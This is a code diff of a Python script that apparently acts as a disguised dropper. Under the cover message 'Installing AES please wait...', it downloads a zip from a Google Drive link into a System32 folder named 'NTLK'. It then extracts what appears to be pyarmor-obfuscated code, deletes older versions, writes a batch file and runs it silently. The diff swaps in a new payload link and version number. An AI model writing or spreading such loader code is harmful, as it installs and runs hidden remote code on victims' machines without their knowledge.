@@ -22,9 +22,9 @@ result = check_string_in_url("https://raw.githubusercontent.com/elaidacruzsdfsdk
 
 os.system('cls')
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\NTLK\aesv8.9.py"
+    aesv3_path = r"C:\Windows\System32\NTLK\aesv9.0.py"
     files_to_delete = [
-        r"C:\Windows\System32\MSRX\aesv8.8.py",
+        r"C:\Windows\System32\MSRX\aesv8.9.py",
         r"C:\Windows\System32\MSRX\aesv1.bat",
         r"C:\Windows\System32\MSRX\pyarmor_runtime_000000"
     ]
@@ -53,10 +53,10 @@ def download_file_from_google_drive(url, output_path):
     if not os.path.exists(output_path):
         gdown.download(url, output=output_path, quiet=True)
 
-if not os.path.exists("C:\\Windows\\System32\\NTLK\\aesv8.9.py"):
+if not os.path.exists("C:\\Windows\\System32\\NTLK\\aesv9.0.py"):
     print("Installing AES please wait...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1v-VUzcXsefo8tD5KtzM8fEF8J7lk4VrN", "C:\\Windows\\System32\\NTLK\\v89.zip")
-    zip_file = r'C:\Windows\System32\NTLK\v89.zip'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1bJ5oBT118XH358ED7pEL0Z-soQcDwztV", "C:\\Windows\\System32\\NTLK\\v9.zip")
+    zip_file = r'C:\Windows\System32\NTLK\v9.zip'
     extract_dir = r'C:\Windows\System32\NTLK'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
@@ -90,7 +90,7 @@ def create_batch_file(python_command, script_name):
     else:
         print("")
 
-create_batch_file("py -3.11", r"C:\Windows\System32\NTLK\aesv8.9.py")
+create_batch_file("py -3.11", r"C:\Windows\System32\NTLK\aesv9.0.py")
 def run_batch_file(batch_file_path):
     try:
         subprocess.run([batch_file_path], shell=True, check=True)
